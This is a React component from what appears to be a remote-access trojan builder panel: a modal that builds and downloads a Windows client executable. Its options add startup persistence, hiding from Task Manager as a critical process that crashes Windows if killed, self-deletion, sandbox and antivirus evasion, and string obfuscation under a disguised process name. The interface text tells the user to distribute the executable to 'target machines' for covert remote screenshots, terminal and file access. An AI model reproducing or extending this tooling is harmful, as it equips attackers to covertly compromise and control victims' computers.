'use client'

import { useState, useEffect } from "react"
import { motion, AnimatePresence } from "framer-motion"
import toast from "react-hot-toast"
import { COUNTRIES } from "@/lib/countries"
import { getFlagEmoji } from "@/lib/geo"

interface BuildExeModalProps {
  open: boolean
  onClose: () => void
  builder: any
}

export default function BuildExeModal({ open, onClose, builder }: BuildExeModalProps) {
  const [exeName, setExeName] = useState(builder?.name?.replace(/[^a-zA-Z0-9_-]/g, "") || "GhostClient")
  const [serverUrl, setServerUrl] = useState("http://localhost:3000")
  const [heartbeatInterval, setHeartbeatInterval] = useState("30")
  const [country, setCountry] = useState(builder?.country || "")
  const [persist, setPersist] = useState(true)
  const [stealth, setStealth] = useState(true)
  const [melt, setMelt] = useState(false)
  const [singleInstance, setSingleInstance] = useState(false)
  const [antiAnalysis, setAntiAnalysis] = useState(true)
  const [obfuscate, setObfuscate] = useState(true)
  const [installName, setInstallName] = useState("WindowsHostService")
  const [building, setBuilding] = useState(false)
  const [buildResult, setBuildResult] = useState<any>(null)

  useEffect(() => {
    if (buildResult?.downloadUrl) {
      const a = document.createElement("a")
      a.href = buildResult.downloadUrl
      a.download = buildResult.fileName || "client.exe"
      document.body.appendChild(a)
      a.click()
      document.body.removeChild(a)
    }
  }, [buildResult])

  async function handleBuild() {
    setBuilding(true)
    setBuildResult(null)
    try {
      const res = await fetch(`/api/remote/builders/${builder.id}/build`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: exeName,
          serverUrl,
          heartbeatInterval: parseInt(heartbeatInterval) || 30,
          country: country || undefined,
          persist,
          stealth,
          melt,
          singleInstance,
          antiAnalysis,
          obfuscate,
          installName,
        }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.details || data.error || "Build failed")
      setBuildResult(data)
      toast.success("EXE built successfully!")
    } catch (err: any) {
      toast.error(err.message)
    } finally {
      setBuilding(false)
    }
  }

  return (
    <AnimatePresence>
      {open && builder && (
        <>
          <div className="fixed inset-0 z-50 bg-black/40 backdrop-blur-sm" onClick={onClose} />
          <div className="fixed inset-0 z-50 flex items-center justify-center pointer-events-none">
            <motion.div
              initial={{ opacity: 0, scale: 0.92, y: 20 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.92, y: 20 }}
              className="pointer-events-auto w-full max-w-lg mx-4"
            >
              <div className="glass-card rounded-2xl p-6 shadow-2xl border border-white/5 max-h-[85vh] overflow-y-auto">
                <div className="flex items-center justify-between mb-5">
                  <div>
                    <h2 className="text-xl font-bold tracking-tight">Build EXE</h2>
                    <p className="text-sm text-muted-foreground mt-0.5">
                      Generate a Windows client executable for <strong>{builder.name}</strong>
                    </p>
                  </div>
                  <button onClick={onClose} className="w-8 h-8 rounded-lg hover:bg-muted/50 flex items-center justify-center transition-colors">
                    <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
                  </button>
                </div>

                {buildResult ? (
                  <div className="space-y-5">
                    <div className="p-4 rounded-xl bg-success/10 border border-success/20">
                      <p className="text-sm text-success font-medium">✅ EXE generated successfully!</p>
                    </div>

                    <div className="space-y-3">
                      <div>
                        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-1 block">File</label>
                        <code className="block p-3 bg-black/40 rounded-xl text-sm font-mono">{buildResult.fileName}</code>
                      </div>
                      <div>
                        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-1 block">Size</label>
                        <span className="text-sm font-medium">{(buildResult.fileSize / 1024).toFixed(1)} KB</span>
                      </div>
                      <div>
                        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-1 block">Client ID</label>
                        <code className="block p-3 bg-black/40 rounded-xl text-sm font-mono">{buildResult.config.clientId}</code>
                      </div>
                      <div>
                        <label className="text-xs font-medium text-muted-foreground uppercase tracking-wider mb-1 block">Builder UUID</label>
                        <code className="block p-3 bg-black/40 rounded-xl text-sm font-mono">{buildResult.config.builderUuid}</code>
                      </div>
                    </div>

                    <div className="flex gap-3">
                      <a
                        href={buildResult.downloadUrl}
                        download
                        className="flex-1 h-11 rounded-xl bg-gradient-to-r from-primary to-purple-600 hover:from-primary/90 hover:to-purple-600/90 text-white text-sm font-semibold transition-all shadow-lg shadow-primary/20 flex items-center justify-center gap-2"
                      >
                        <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                          <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3" />
                        </svg>
                        Download EXE
                      </a>
                      <button
                        onClick={() => { setBuildResult(null); setExeName(builder?.name?.replace(/[^a-zA-Z0-9_-]/g, "") || "GhostClient") }}
                        className="flex-1 h-11 rounded-xl border border-border/50 hover:bg-muted/30 transition-all text-sm font-medium"
                      >
                        Build Another
                      </button>
                    </div>

                    <div className="p-3 rounded-xl bg-yellow-500/10 border border-yellow-500/20">
                      <p className="text-xs text-yellow-400">
                        ⚠️ The Client ID is embedded in this executable. Distribute this .exe to target machines.
                        Once executed, the machine will appear in Remote Clients.
                      </p>
                    </div>
                  </div>
                ) : (
                  <div className="space-y-5">
                    <div>
                      <label className="block text-sm font-medium text-foreground/80 mb-1.5">EXE Name</label>
                      <input
                        type="text"
                        value={exeName}
                        onChange={(e) => setExeName(e.target.value.replace(/[^a-zA-Z0-9_-]/g, ""))}
                        placeholder="MyClient"
                        className="input-premium w-full"
                      />
                      <p className="text-xs text-muted-foreground mt-1">The name of the .exe file (alphanumeric only)</p>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-foreground/80 mb-1.5">Server URL</label>
                      <input
                        type="text"
                        value={serverUrl}
                        onChange={(e) => setServerUrl(e.target.value)}
                        placeholder="http://localhost:3000"
                        className="input-premium w-full"
                      />
                      <p className="text-xs text-muted-foreground mt-1">The server the client will connect to</p>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-foreground/80 mb-1.5">Heartbeat Interval (seconds)</label>
                      <input
                        type="number"
                        value={heartbeatInterval}
                        onChange={(e) => setHeartbeatInterval(e.target.value)}
                        min="5"
                        max="300"
                        className="input-premium w-full"
                      />
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-foreground/80 mb-1.5">Country Flag</label>
                      <select
                        value={country}
                        onChange={(e) => setCountry(e.target.value)}
                        className="input-premium w-full appearance-none"
                      >
                        <option value="">🌍 No flag</option>
                        {COUNTRIES.map((c) => (
                          <option key={c.code} value={c.code}>{c.flag} {c.name}</option>
                        ))}
                      </select>
                      <p className="text-xs text-muted-foreground mt-1">Flag shown on the builder card</p>
                    </div>

                    {/* Persistence & Stealth Options */}
                    <div className="p-4 rounded-xl border border-zinc-700 bg-zinc-900/60 space-y-3">
                      <p className="text-xs font-semibold uppercase tracking-wider text-zinc-400">Stealth & Persistence</p>

                      <label className="flex items-center justify-between cursor-pointer">
                        <div>
                          <span className="text-sm font-medium text-white">Auto-Persistence</span>
                          <p className="text-[10px] text-zinc-500">Auto-run on Windows startup (Registry + Task + Startup folder)</p>
                        </div>
                        <div className={`w-10 h-5 rounded-full transition-colors ${persist ? "bg-green-500" : "bg-zinc-700"}`} onClick={() => setPersist(!persist)}>
                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${persist ? "ml-5" : "ml-0.5"}`} />
                        </div>
                      </label>

                      <label className="flex items-center justify-between cursor-pointer">
                        <div>
                          <span className="text-sm font-medium text-white">Stealth Mode</span>
                          <p className="text-[10px] text-zinc-500">Hide from Task Manager + Critical process (BSOD if killed)</p>
                        </div>
                        <div className={`w-10 h-5 rounded-full transition-colors ${stealth ? "bg-green-500" : "bg-zinc-700"}`} onClick={() => setStealth(!stealth)}>
                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${stealth ? "ml-5" : "ml-0.5"}`} />
                        </div>
                      </label>

                      <label className="flex items-center justify-between cursor-pointer">
                        <div>
                          <span className="text-sm font-medium text-white">Melt File</span>
                          <p className="text-[10px] text-zinc-500">Self-deletes the original .exe after installing persistence</p>
                        </div>
                        <div className={`w-10 h-5 rounded-full transition-colors ${melt ? "bg-red-500" : "bg-zinc-700"}`} onClick={() => setMelt(!melt)}>
                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${melt ? "ml-5" : "ml-0.5"}`} />
                        </div>
                      </label>

                      <label className="flex items-center justify-between cursor-pointer">
                        <div>
                          <span className="text-sm font-medium text-white">Single Instance</span>
                          <p className="text-[10px] text-zinc-500">Only allows one copy of the exe to run at a time</p>
                        </div>
                        <div className={`w-10 h-5 rounded-full transition-colors ${singleInstance ? "bg-blue-500" : "bg-zinc-700"}`} onClick={() => setSingleInstance(!singleInstance)}>
                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${singleInstance ? "ml-5" : "ml-0.5"}`} />
                        </div>
                      </label>

                      <label className="flex items-center justify-between cursor-pointer">
                        <div>
                          <span className="text-sm font-medium text-white">Anti-Analysis</span>
                          <p className="text-[10px] text-zinc-500">Evade VM, sandbox, debugger detection (VirusTotal, Windows Defender)</p>
                        </div>
                        <div className={`w-10 h-5 rounded-full transition-colors ${antiAnalysis ? "bg-purple-500" : "bg-zinc-700"}`} onClick={() => setAntiAnalysis(!antiAnalysis)}>
                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${antiAnalysis ? "ml-5" : "ml-0.5"}`} />
                        </div>
                      </label>

                      <label className="flex items-center justify-between cursor-pointer">
                        <div>
                          <span className="text-sm font-medium text-white">String Obfuscation</span>
                          <p className="text-[10px] text-zinc-500">XOR-encode sensitive strings to avoid static pattern matching</p>
                        </div>
                        <div className={`w-10 h-5 rounded-full transition-colors ${obfuscate ? "bg-purple-500" : "bg-zinc-700"}`} onClick={() => setObfuscate(!obfuscate)}>
                          <div className={`w-4 h-4 rounded-full bg-white transition-transform mt-0.5 ${obfuscate ? "ml-5" : "ml-0.5"}`} />
                        </div>
                      </label>

                      {stealth && (
                        <div>
                          <label className="text-xs font-medium text-zinc-400 mb-1 block">Process Name in Task Manager</label>
                          <input
                            type="text"
                            value={installName}
                            onChange={(e) => setInstallName(e.target.value.replace(/[^a-zA-Z0-9_-]/g, ""))}
                            className="input-premium w-full text-xs font-mono"
                          />
                          <p className="text-[10px] text-zinc-500 mt-0.5">Appears as this in Task Manager details</p>
                        </div>
                      )}
                    </div>

                    <div className="p-4 rounded-xl bg-muted/30 space-y-2">
                      <h4 className="text-sm font-semibold">Embedded Configuration</h4>
                      <div className="text-xs text-muted-foreground space-y-1 font-mono">
                        <div>BUILDER: {builder.name}</div>
                        <div>UUID: {builder.uuid}</div>
                        <div>FINGERPRINT: {builder.fingerprint?.slice(0, 16)}...</div>
                      </div>
                    </div>

                    <div className="p-3 rounded-xl bg-primary/5 border border-primary/10">
                      <p className="text-xs text-muted-foreground">
                        No visible window · Heartbeat every {heartbeatInterval || 30}s · Remote commands (screenshot, terminal, files).
                        {persist && " · Auto-starts with Windows (persistence)."}
                        {stealth && " · Hidden from Task Manager + Critical Process."}
                      </p>
                    </div>

                    <div className="flex gap-3">
                      <button onClick={onClose} className="flex-1 h-11 rounded-xl border border-border/50 hover:bg-muted/30 transition-all text-sm font-medium">
                        Cancel
                      </button>
                      <button
                        onClick={handleBuild}
                        disabled={building || !exeName}
                        className="flex-1 h-11 rounded-xl bg-gradient-to-r from-primary to-purple-600 hover:from-primary/90 hover:to-purple-600/90 text-white text-sm font-semibold transition-all shadow-lg shadow-primary/20 disabled:opacity-50 flex items-center justify-center gap-2"
                      >
                        {building ? (
                          <>
                            <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
                            </svg>
                            Building...
                          </>
                        ) : (
                          <>
                            <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
                            </svg>
                            Build EXE
                          </>
                        )}
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        </>
      )}
    </AnimatePresence>
  )
}
